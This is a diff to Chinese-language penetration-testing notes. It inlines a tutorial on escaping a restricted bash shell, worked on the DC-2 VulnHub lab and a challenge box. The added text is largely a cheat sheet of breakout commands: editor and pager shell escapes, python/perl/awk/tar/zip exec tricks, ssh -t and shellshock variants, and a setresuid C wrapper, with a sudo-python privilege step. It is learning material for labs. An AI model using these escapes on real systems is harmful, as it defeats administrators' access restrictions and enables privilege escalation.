@@ -486,7 +486,7 @@ sudo git -p help
 
 #### 3、git的使用
 
-这里以DC-2靶场为例。
+这里以DC-2靶场为例
 
 ~~~ B
  sudo git -p help
@@ -503,15 +503,485 @@ sudo git -p help
 
 ### 2、rbash绕过
 
-[rbash绕过-CSDN博客](https://blog.csdn.net/weixin_43705814/article/details/111879362)
+#### 一、前言
+
+在进行dc-2的靶场渗透时遇到了rbash受限，查阅了大佬们写的笔记了解一下原理，做一下总结好让自己更好的理解掌握。
+首先我们要知道为什么要进行rbash绕过，rbash是受限的shell的一种此外还有rbash、rksh和rsh，为什么要对shell进行限制呢，有以下几个原因:
+
+1.提高安全性，防止黑客和渗透测试人员的入侵
+2.限制一些会对系统造成危害的危险命令
+3.为了提高渗透测试人员的个人能力，在一些靶机上设置受限的shell让测试人员绕过拿flag
+
+
+
+#### 二、常见的绕过方法
+
+在DC-2靶机中进行操作；链接:https://www.vulnhub.com/entry/dc-2,311/
+
+
+
+##### 2.1 枚举linux环境
+
+在rbash的绕过中，枚举linux环境就像渗透测试中的信息收集，两者在各自的操作中起到了决定性的作用，掌握的信息越多，绕过的方法就越多。
+
+
+
+###### 检查可用命令
+
+在受限的shell中也会有一些命令可以使用我们可以尝试一些常见命令看看有没有被限制
+
+![242c209f10885ff7b18752e54657c6c4](./img/242c209f10885ff7b18752e54657c6c4.png)
+
+![0630c48ea623135d8fff88ed0691a673](./img/0630c48ea623135d8fff88ed0691a673.png)
+
+这里发现 / cd whoami 等命令都被禁止
+
+
+
+##### 2.2 绕过shell
+
+###### 2.2.1 可以通过vi编辑器，编辑进行绕过
+
+~~~ bash
+vi：set shell=/bin/sh
+运行shell:shell
+~~~
+
+![eec855118ffaf7f6a426597629fa62fa](./img/eec855118ffaf7f6a426597629fa62fa.png)
+
+![a4d51aa8cb755168d687e8829e673593](./img/a4d51aa8cb755168d687e8829e673593.png)
+
+~~~ bash
+export PATH=/usr/sbin:/usr/bin:/sbin:/bin
+~~~
+
+![c9ea0b5043a992347d907da3879f89de](./img/c9ea0b5043a992347d907da3879f89de.png)
+
+
+
+###### 2.2.2 执行如下命令进行绕过
+
+~~~ bash
+BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`
+export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出
+export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出
+~~~
+
+成功绕过shell
+
+![57d741a9c7e2839e3d27ead259bcd6ae](./img/57d741a9c7e2839e3d27ead259bcd6ae.png)
 
 
 
 ### 3、Linux Restricted Shell绕过技巧总结
 
-[Linux Restricted Shell绕过技巧总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/188989.html)
+#### 0x01 前言
+
+**如今网络安全行业越来越规范，我们还想直接获取到未限制的shell是件很困难的事情，系统运维人员一般都会给Linux shell加上一些限制来防止入侵，通常会阻止运行某些特定的命令**
 
 
+
+##### 0x01 什么是Restricted Shell
+
+Restricted Shell既受限的shell，它与一般标准shell的区别在于会限制执行一些行为，比如：
+
+~~~ txt
+使用 cd 来改变路径
+设置或取消SHELL,PATH,ENV,或BASH_ENV变量的值
+指定的命令名中包含/
+~~~
+
+
+
+##### 0x02 如何设置一个Restricted Shell
+
+我们可以先复制一个bash，然后设置某个用户登录后运行的shell：
+
+~~~ bash
+cp /bin/bash  /bin/rbash
+useradd -s /bin/rbash zusheng
+~~~
+
+然后允许不允许什么命令，就可以自行修改了。
+
+
+
+#### 0x02 枚举Linux环境
+
+首先我们需要去检查Linux环境能做什么，这相当于一个收集情报的工作，这个步骤必不可少，有了情报才可以分析下一步骤该如何去做。
+
+
+
+##### 命令
+
+###### 检查可用的命令：
+
+~~~ bash
+如cd、ls、echo等
+~~~
+
+![1541820877_5be651cd47f6f](./img/1541820877_5be651cd47f6f.png)
+
+
+
+###### **操作符：**
+
+~~~ bash
+>
+>>
+<
+|
+~~~
+
+
+
+###### **root身份运行哪些命令：**
+
+~~~ bash
+sudo -l
+~~~
+
+
+
+##### 检查shell
+
+~~~ bash
+echo $SHELL
+基本上都是/bin/rbash
+~~~
+
+
+
+##### 编程语言
+
+检查可用的编程语言，如python、perl、ruby等
+
+![1541820884_5be651d4f16c8](./img/1541820884_5be651d4f16c8.png)
+
+
+
+##### 检查环境变量
+
+.运行env或者printenv
+
+
+
+#### 0x03 常见利用技术
+
+##### "/"字符被允许
+
+如果/被允许，我们可以直接运行：
+
+![1541820889_5be651d9b9089](./img/1541820889_5be651d9b9089.png)
+
+允许：
+
+![1541820893_5be651dd2ef0e](./img/1541820893_5be651dd2ef0e.png)
+
+
+
+##### cp命令被允许
+
+如果cp命令被允许，我们可以直接复制/bin/bash到本用户目录：
+
+![1541820898_5be651e23b6c0](./img/1541820898_5be651e23b6c0.png)
+
+允许：
+
+![1541820902_5be651e609637](./img/1541820902_5be651e609637.png)
+
+
+
+#### 0x04 常见应用
+
+探测系统中是否存在常见应用，如FTP、GDB等
+
+
+
+##### FTP
+
+~~~ bash
+ftp > !/bin/sh
+~~~
+
+
+
+##### GDB
+
+~~~ bash
+gdb > !/bin/sh
+~~~
+
+![1541820907_5be651eb2e109](./img/1541820907_5be651eb2e109.png)
+
+
+
+##### man/git
+
+~~~ bash
+man > !/bin/sh
+git > git help status
+~~~
+
+![1541820915_5be651f3694bf](./img/1541820915_5be651f3694bf.png)
+
+![1541820919_5be651f7cccaa](./img/1541820919_5be651f7cccaa.png)
+
+
+
+##### vim
+
+~~~ bash
+!/bin/sh 或者 !/bin/bash
+~~~
+
+![1541820924_5be651fcae8f6](./img/1541820924_5be651fcae8f6.png)
+
+允许情况下：
+
+![1541820929_5be652013957a](./img/1541820929_5be652013957a.png)
+
+
+
+##### more/less
+
+~~~ bash
+!'sh'
+~~~
+
+![1541820936_5be65208ce705](./img/1541820936_5be65208ce705.png)
+
+![1541820943_5be6520f69d1c](./img/1541820943_5be6520f69d1c.png)
+
+
+
+##### set shell 
+
+在一些编辑器或命令中我们还以为设置shell变量然后执行，比如vim中：
+
+![1541820955_5be6521b1eaec](./img/1541820955_5be6521b1eaec.png)
+
+![1541820962_5be6522246cf0](./img/1541820962_5be6522246cf0.png)
+
+
+
+##### 更改PATH或SHELL环境变量
+
+输入命令
+
+~~~ bash
+export -p
+~~~
+
+查看
+
+![1541820968_5be65228e6fe6](./img/1541820968_5be65228e6fe6.png)
+
+PATH和SHELL变量很可能是'-rx'，这意味着你只能执行不能写入，如果可写，你就可以直接写入/bin/bash。
+
+
+
+##### 编程语言
+
+###### python
+
+~~~ bash
+python -c 'import os; os.system("/bin/bash")'
+~~~
+
+
+
+###### php
+
+~~~ bash
+php -a then exec("sh -i");
+~~~
+
+
+
+###### perl
+
+~~~ bash
+perl -e 'exec "/bin/sh";'
+~~~
+
+
+
+###### lua
+
+~~~ bash
+os.execute('/bin/sh')
+~~~
+
+
+
+######  ruby
+
+~~~~ bahs
+exec "/bin/sh"
+~~~~
+
+
+
+##### 最新技术
+
+###### ssh
+
+~~~ bash
+ssh username@IP - t "/bin/sh" or "/bin/bash"
+~~~
+
+
+
+###### ssh2
+
+~~~ bash
+ssh username@IP -t "bash --noprofile"
+~~~
+
+
+
+###### ssh3
+
+~~~ bash
+ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
+~~~
+
+
+
+###### ssh4
+
+~~~~ bash
+ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)
+~~~~
+
+
+
+###### ZIP
+
+~~~ bash
+zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
+~~~
+
+
+
+###### tar
+
+~~~ bash
+tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
+~~~
+
+
+
+###### awk
+
+~~~~ bash
+awk 'BEGIN {system("/bin/bash")}'
+~~~~
+
+
+
+###### scp
+
+~~~ bash
+ scp -S ./spellbash.sh 127.0.0.1:/tmp/z.zip ./
+ scp -S program： 指定加密传输时所使用的程序
+~~~
+
+我们这个spellbash.sh脚本功能就在于给shell加权限执行
+
+shell代码如下：
+
+~~~ shell
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+int main(int argc, char **argv, char **envp)
+{
+    setresgid(getegid(), getegid(), getegid());
+    setresuid(geteuid(), geteuid(), geteuid());
+
+    execve("/bin/bash", argv,  envp);
+    return 0;
+}
+~~~
+
+
+
+###### pico
+
+~~~~ bash
+pico -s "/bin/bash"
+然后输入/bin/bash按CTRL + T
+~~~~
+
+
+
+#### 0x05 实战操作
+
+针对于Linux Restricted Shell绕过技巧基本上是介绍到了，接下来就是灵活运用的问题，我这里选择了一个挑战来运用一下文中的一些技术。
+
+连接上机器，经过一番信息收集，我们发现只有vim可以利用一下：
+
+![1541820978_5be652327a4ec](./img/1541820978_5be652327a4ec.png)
+
+尝试
+
+~~~ bash
+!/bin/bash
+/bin/rbash: /bin/bash: restricted: cannot specify `/' in command names
+~~~
+
+
+
+继续尝试
+
+~~~ bash
+set shell=/bin/bash
+shell
+~~~
+
+
+
+可以发现我们成功绕过了rbash
+
+![1541820983_5be65237b6e8c](./img/1541820983_5be65237b6e8c.png)
+
+
+
+随后我们发现当前用户没有打开目标文件的权限，sudo -l查看一下能运行哪些命令
+
+~~~ bash
+(app-script-ch14-2) NOPASSWD: /usr/bin/python
+~~~
+
+
+
+我们以app-script-ch14-2运行python，思路上面也提到了，可以利用python运行bash
+
+~~~ bash
+/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("/bin/bash")'
+~~~
+
+
+
+继续sudo -l
+
+![1541820989_5be6523df3c31](./img/1541820989_5be6523df3c31.png)
+
+
+
+tar上面也总结过了:
+
+![1541820995_5be6524339c9e](./img/1541820995_5be6524339c9e.png)
+
+
+
+接下来套路基本上一样不再演示了。
+
+
+
+### 4、其他资源
 
 + [[ vulnhub靶机通关篇 \] 渗透测试综合靶场 DC-2 通关详解 (附靶机搭建教程)_vnlubun靶场-CSDN博客](https://blog.csdn.net/qq_51577576/article/details/129470150)
 
